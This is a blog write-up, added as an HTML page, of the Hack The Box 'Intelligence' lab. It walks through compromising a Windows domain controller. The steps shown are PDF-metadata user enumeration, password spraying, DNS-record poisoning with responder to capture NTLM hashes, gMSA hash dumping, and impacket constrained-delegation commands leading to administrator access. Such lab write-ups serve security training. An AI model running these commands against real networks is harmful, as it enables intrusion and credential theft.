@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <link rel="stylesheet" type="text/css" href="/assets/css/print.css" media="print">
+    <!--[if lt IE 9]>
+    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HTB Writeup [Windows - Medium] - Intelligence | OmniSl4sh’s Blog</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="HTB Writeup [Windows - Medium] - Intelligence" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="https://omnisl4sh.github.io/2022/07/01/Intelligence.html" />
+<meta property="og:url" content="https://omnisl4sh.github.io/2022/07/01/Intelligence.html" />
+<meta property="og:site_name" content="OmniSl4sh’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-07-01T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HTB Writeup [Windows - Medium] - Intelligence" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-01T00:00:00+02:00","datePublished":"2022-07-01T00:00:00+02:00","headline":"HTB Writeup [Windows - Medium] - Intelligence","mainEntityOfPage":{"@type":"WebPage","@id":"https://omnisl4sh.github.io/2022/07/01/Intelligence.html"},"url":"https://omnisl4sh.github.io/2022/07/01/Intelligence.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body>
+    <div id="container">
+      <div class="inner">
+        <header>
+          <h1><a href="https://omnisl4sh.github.io/">OmniSl4sh's Blog</a></h1>
+          <h2></h2>
+        </header>
+        <!--<<section id="downloads" class="clearfix">
+          
+  
+        </section>
+        hr>-->
+        <section id="main_content">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HTB Writeup [Windows - Medium] - Intelligence</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-07-01T00:00:00+02:00" itemprop="datePublished">Jul 1, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>
+
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A <strong>Windows Domain Controller</strong> that’s hosting a static website on port 80.</li>
+  <li><em>While browsing the site,</em> we notice two links to <strong>PDF</strong> files that exist on a web directory for documents.</li>
+  <li><em>When checking the naming of the</em> <strong>PDF</strong> <em>files,</em> we notice a date-based scheme. So, we make a list of file names to look for other documents.</li>
+  <li>We find a lot of documents containing dummy text. Except for two which included information about a <strong>default password</strong> and about administrative activity going on as well as some hardening.</li>
+  <li>We also get a list of usernames when inspecting the metadata of the files. We use those to spray the domain users which results in our first set of credentials (<code class="language-plaintext highlighter-rouge">Tiffany.Molina</code>).</li>
+  <li><em>While checking Tiffany’s</em> <strong>SMB</strong> <em>share access,</em> we come across a <strong>PowerShell</strong> script on the <strong>“IT”</strong> share that routinely queries <strong>DNS</strong> for record names starting with <strong>“web”</strong> and issues <strong>authenticated</strong> web requests to them.</li>
+  <li><em>Knowing this information,</em> we use a tool called <code class="language-plaintext highlighter-rouge">dnstool.py</code> from the <strong>Krbrelayx</strong> toolkit to add a record that starts with <strong>“web”</strong> and points to our Kali machine’s IP address.</li>
+  <li><em>Having fired our</em> <code class="language-plaintext highlighter-rouge">responder</code> <em>to capture the</em> <strong>HTTP</strong> <em>request,</em> we wait for a couple of minutes and get the hash of a user called <code class="language-plaintext highlighter-rouge">ted.graves</code> who was running the script.</li>
+  <li><em>After running a</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>collection and viewing exploit paths from the users we own,</em> we find that <strong>Ted</strong> can read the <strong>gMSA</strong> password of <code class="language-plaintext highlighter-rouge">SVC_INT</code> which has <strong>contrained delegation</strong> on the Domain Controller.</li>
+  <li>We use the <code class="language-plaintext highlighter-rouge">gMSADumper</code> python tool to get the <strong>NTLM hash</strong> of <code class="language-plaintext highlighter-rouge">SVC_INT</code> and use it to request a <strong>silver ticket</strong> impersonating the <code class="language-plaintext highlighter-rouge">Administrator</code> for a full domain takeover.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: Intelligence
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-30 20:31:02Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Not valid before: 2021-04-19T00:43:16
+|_Not valid after:  2022-04-19T00:43:16
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49692/tcp open  msrpc         Microsoft Windows RPC
+49708/tcp open  msrpc         Microsoft Windows RPC
+49715/tcp open  msrpc         Microsoft Windows RPC
+51310/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+| smb2-time:
+|   date: 2022-06-30T20:31:57
+|_  start_date: N/A
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+</code></pre></div></div>
+<p><em>Viewing the port scan results,</em> we notice:</p>
+
+<ol>
+  <li>Standard Domain Controller ports: 53, 88, 389 &amp; 445</li>
+  <li><strong>WinRM</strong> on port 5985 which is nice for shell access</li>
+  <li><strong>IIS 10</strong> on Port 80 that we should take a look at</li>
+  <li><em>On the last line,</em> the <strong>Clock Skew</strong> between our host and the DC is 7 hours (which is something we must take care of to make sure anything <strong>Kerberos-related</strong> works well)</li>
+</ol>
+
+<h3 id="the-website">The Website</h3>
+<p><img src="/assets/Intelligence/website-homepage.jpg" alt="website-homepage" /></p>
+
+<p>checking the website’s home page doesn’t show anything special except for this:</p>
+
+<p><img src="/assets/Intelligence/document-links.jpg" alt="document-links" /></p>
+
+<p><em>Upon clicking any of those links,</em> we get directed to a <strong>“documents”</strong> directory.</p>
+
+<p>The content is some filler text. But we notice the naming of the documents is based on dates.</p>
+
+<p><img src="/assets/Intelligence/document-naming.jpg" alt="document-naming" /></p>
+
+<p>This is interesting because:</p>
+
+<ul>
+  <li>we want to see if there were <em>other documents</em></li>
+  <li><em>And if there were more,</em> we want to check their <strong>content</strong> as well as their <strong>metadata</strong></li>
+</ul>
+
+<p>we might get information we could use.</p>
+
+<h3 id="searching-documents">Searching Documents</h3>
+<p>We’re going to create a script that generates a list of <strong>PDF</strong> file names following the scheme we found.</p>
+
+<p>We’ll make the script generate dates between 2018 to 2022. That’s 2 years before and after the date of the found documents.</p>
+
+<p><strong>Note:</strong> This date range can take some time in the upcoming step. You can change it to be 2020 to 2021 if you just want to skip right to the solution. I’m only showing this because that’s what I did on my actual run :)</p>
+
+<p><em>Since I am most comfortable with</em> <strong>PowerShell</strong> <em>and since it also runs on</em> <strong>Linux</strong>, I’m going to be using it.</p>
+
+<p>Here’s the script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>foreach($year in (2018 .. 2022)){
+	foreach($month in (1 .. 12)){
+	        if ($month -lt 10){$month = "0$month"}   # if the month's number is less than 10, put a zero before it
+	        foreach($day in (1..31)){
+	                if($day -lt 10){$day = "0$day"}  # if the day's number is less than 10, put a zero before it
+
+	                "$year-$month-$day-upload.pdf" &gt;&gt; pdf_name_list.txt # output the generated name into a text file
+	        }
+	}
+}
+</code></pre></div></div>
+
+<p>Which works like a charm :D</p>
+
+<p><img src="/assets/Intelligence/pdf-name-generation.jpg" alt="pdf-name-generation" /></p>
+
+<p>We create a specific folder for the <strong>PDF</strong>s and then write a quick <strong>bash</strong> loop to download every document it can find. we use <code class="language-plaintext highlighter-rouge">wget</code> with the <code class="language-plaintext highlighter-rouge">-q</code> flag to make it go quietly.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for doc in $(cat pdf_name_list.txt); do wget -q "http://10.10.10.248/documents/$doc"; done
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/a-lot-of-pdfs.jpg" alt="a-lot-of-pdfs" /></p>
+
+<p>The result is a large list of <strong>PDF</strong>s (99) from that process.</p>
+
+<p>We wanted to find a tool to get us their content in text if possible. So we <strong>Googled</strong> for it:</p>
+
+<p><img src="/assets/Intelligence/searching-for-pdf2text.jpg" alt="searching-for-pdf2text" /></p>
+
+<p><img src="/assets/Intelligence/pdf2text-instructions.jpg" alt="pdf2text-instructions" /></p>
+
+<p><em>After installing the package,</em> We’re going to use another <strong>bash</strong> script to create the converted text files.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for pdf in $(ls *.pdf); do pdftotext $pdf; done
+</code></pre></div></div>
+
+<p>We end up with 99 text files that we need to browse through :D</p>
+
+<p>Time for another script xD</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for text in $(ls *.txt); do echo $text; echo '---------------------'; cat $text; echo 'press any key to continue'; read; done
+</code></pre></div></div>
+
+<p>This displays the document names and allows you to browse each.</p>
+
+<p>We find one interesting document: <code class="language-plaintext highlighter-rouge">2020-06-07-upload.txt</code></p>
+
+<p><img src="/assets/Intelligence/second_note.jpg" alt="second_note" /></p>
+
+<p>Which talks about changing the default password: <strong>“NewIntelligenceCorpUser9876”</strong> for new users after logging in.</p>
+
+<p><em>If one of the users still has this password</em>, this could be our way of gaining access.</p>
+
+<p>We also find another document: <code class="language-plaintext highlighter-rouge">2020-12-30-upload.txt</code></p>
+
+<p><img src="/assets/Intelligence/first_note.jpg" alt="first_note" /></p>
+
+<p>It talks about a user <code class="language-plaintext highlighter-rouge">ted</code> (<em>who’s probably in IT</em>) developing a <strong>script</strong> to notify people if a web server goes down.</p>
+
+<p>And it also mentions <strong>“locking down service accounts”</strong> which hints at a <strong>possible security concern</strong> in that area.</p>
+
+<h3 id="interesting-information-in-metadata">Interesting Information in Metadata</h3>
+<p>Now we need a list of usernames..</p>
+
+<p><em>With all those</em> <strong>PDF</strong>s <em>lying around,</em> we’re tempted to look for information in <strong>metadata.</strong></p>
+
+<p>Our tool of choice is <code class="language-plaintext highlighter-rouge">exiftool</code></p>
+
+<p>We do a quick sample test on one of the documents:</p>
+
+<p><img src="/assets/Intelligence/creator-metada.jpg" alt="creator-metada" /></p>
+
+<p>We find that there’s a <strong>Creator</strong> field with a possible username in it.</p>
+
+<p>We use the tool with the <code class="language-plaintext highlighter-rouge">-creator</code> flag to only extract that field.</p>
+
+<p>We couple this with some Shell Fu to create a user list:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for pdf in $(ls *.pdf); do exiftool -creator $pdf | awk -F ': ' '{print $2}'; done | sort -u &gt; userlist.txt
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/exiftool-userlist.jpg" alt="exiftool-userlist" /></p>
+
+<p>Clean! :D</p>
+
+<p>We then validate those usernames using <a href="https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a></p>
+
+<p><img src="/assets/Intelligence/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>
+
+<p>All 30 users were valid.</p>
+
+<p><em>Before spraying them with the default password,</em> we gotta sync our time with the <strong>Domain Controller</strong> since we’re going to be doing <strong>Kerberos authentication</strong>.</p>
+
+<p>A tool that automates that is <code class="language-plaintext highlighter-rouge">ntpdate</code>. But you have to disable the <strong>Automatic Time Feature</strong> in kali first using <code class="language-plaintext highlighter-rouge">timedatectl set-ntp off</code></p>
+
+<p>We do this and we’re now in sync with the <strong>DC</strong> :]</p>
+
+<p><img src="/assets/Intelligence/remove-clock-skew.jpg" alt="remove-clock-skew" /></p>
+
+<p><img src="/assets/Intelligence/got-tiffany.jpg" alt="got-tiffany" /></p>
+
+<p>Tiffany hadn’t changed her default password. Lucky for us :D</p>
+
+<h3 id="exploiting-the-vulnerable-script">Exploiting the Vulnerable Script</h3>
+<p><em>When checking the readable</em> <strong>SMB</strong> <em>shares as Tiffany,</em> we find that she can read a certain share: <strong>IT</strong></p>
+
+<p><img src="/assets/Intelligence/smb-shares-tiffany.jpg" alt="smb-shares-tiffany" /></p>
+
+<p>We connect to it using <code class="language-plaintext highlighter-rouge">smbclient</code> and find the script that the previous note was talking about:</p>
+
+<p><img src="/assets/Intelligence/script.jpg" alt="script" /></p>
+
+<p>When checking its content:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+	try {
+		$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+		if(.StatusCode -ne 200) {
+			Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject "Host: $($record.Name) is down"
+		}
+	}
+	catch {}
+}
+</code></pre></div></div>
+
+<p>We can see that the script:</p>
+<ul>
+  <li>Runs every 5 minutes
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Check web server status. Scheduled to run every 5min
+</code></pre></div>    </div>
+  </li>
+  <li>Looks for <strong>DNS</strong> records that start with <strong>“web”</strong>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*"
+</code></pre></div>    </div>
+  </li>
+  <li>Uses the credentials of the user running the script to issue web requests for every record match
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p><em>In order to exploit this,</em> we need to:</p>
+<ol>
+  <li>Find a way to put up a <strong>DNS</strong> record that points to our attacker machine</li>
+  <li>Start a web server that can capture the <strong>NTLM authentication</strong> sent with the request</li>
+</ol>
+
+<p>The answers for both those challenges is <a href="/assets/Intelligence/https://github.com/dirkjanm/krbrelayx">dnstool.py</a> from the <strong>krbrelayx</strong> toolkit and <a href="https://github.com/SpiderLabs/Responder">responder</a></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">dnstool.py</code></strong> lets us set a <strong>DNS</strong> record if we have valid domain credentials.</p>
+
+<p>We check its help and upload a record that points to our <strong>Kali</strong></p>
+
+<p><img src="/assets/Intelligence/dnstool-usage.jpg" alt="dnstool-usage" /></p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">responder</code></strong> starts a <em>specially-setup</em> HTTP server that will capture the <strong>NTLMv2</strong> hash of the incoming request.</p>
+
+<p>We will start it specifying our <strong>VPN</strong> tunnel interface: <code class="language-plaintext highlighter-rouge">responder -I tun0</code></p>
+
+<p><em>After a few minutes,</em> we get an <strong>NTLMv2</strong> hash for the <code class="language-plaintext highlighter-rouge">Ted.Graves</code> user.</p>
+
+<p><img src="/assets/Intelligence/captured-hash.jpg" alt="captured-hash" /></p>
+
+<p>We could successfully crack it using <code class="language-plaintext highlighter-rouge">john</code></p>
+
+<p><img src="/assets/Intelligence/teddys-hash-cracked.jpg" alt="teddys-hash-cracked" /></p>
+
+<h3 id="bloodhound-and-the-path-to-domain-admin">Bloodhound and the Path to Domain Admin</h3>
+<p><em>After running the</em> <strong>Bloodhound</strong> <em>python Ingestor</em> <a href="/assets/Intelligence/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">Bloodhound.py</code></a>, we mark our user <code class="language-plaintext highlighter-rouge">Ted.Graves</code> as owned.</p>
+
+<p>We see a <strong>clear exploit path</strong> to <strong>Domain Admin</strong> when we view the results of the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principals</code> built-in query:</p>
+
+<p><img src="/assets/Intelligence/bloodhound-path-to-da.jpg" alt="bloodhound-path-to-da" /></p>
+
+<ol>
+  <li><strong>Ted</strong> can read the password for <code class="language-plaintext highlighter-rouge">SVC_INT$</code></li>
+  <li><code class="language-plaintext highlighter-rouge">SVC_INT$</code> has <strong>Constrained Delegation</strong> over the Domain Controller (which we will talk about in the next section).</li>
+</ol>
+
+<p>Let’s first get the <strong>NTLM</strong> hash for the <code class="language-plaintext highlighter-rouge">SVC_INT$</code> group-managed service account.</p>
+
+<p>we can do so using <a href="/assets/Intelligence/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>
+
+<p><img src="/assets/Intelligence/gMSADumped.jpg" alt="gMSADumped" /></p>
+
+<p>We’re now good for the next step.</p>
+
+<h3 id="abusing-constrained-delegation">Abusing Constrained Delegation</h3>
+<p><em>In our case,</em> <code class="language-plaintext highlighter-rouge">SVC_INT$</code> is allowed delegation to the Domain Controller.</p>
+
+<p>This means that it can <strong>impersonate any user</strong> (even Administrators) when interacting with the DC as the <strong>WWW</strong> service.</p>
+
+<p>We know so by inspecting the account on <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
+
+<p><img src="/assets/Intelligence/allowed-to-delegate.jpg" alt="allowed-to-delegate" /></p>
+
+<p><em>However, because the</em> <strong>service portion</strong> <em>in the granted</em> <strong>service ticket</strong> <em>is</em> <strong>unprotected</strong>, we may alter it for <strong>any service</strong> we want.</p>
+
+<p><strong>For example:</strong> we can get a ticket for the <strong>LDAP</strong> service and be granted <strong>DCSync</strong> rights.</p>
+
+<p>It was all mentioned on the <strong>Bloodhound</strong> help</p>
+
+<p><img src="/assets/Intelligence/allowed-to-delegate-bh-help.jpg" alt="allowed-to-delegate-bh-help" /></p>
+
+<p>Let’s go ahead and exploit this! :D</p>
+
+<p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>
+
+<p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export KRB5CCNAME=&lt;path/to/ticket&gt;
+psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
+</code></pre></div></div>
+
+<p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>
+
+<p>Pretty sweet :D</p>
+
+  </div><a class="u-url" href="/2022/07/01/Intelligence.html" hidden></a>
+</article>
+
+        </section>
+
+        <footer>
+        
+          This page was generated by <a href="https://pages.github.com">GitHub Pages</a>.
+        </footer>
+
+      </div>
+    </div>
+  </body>
+</html>
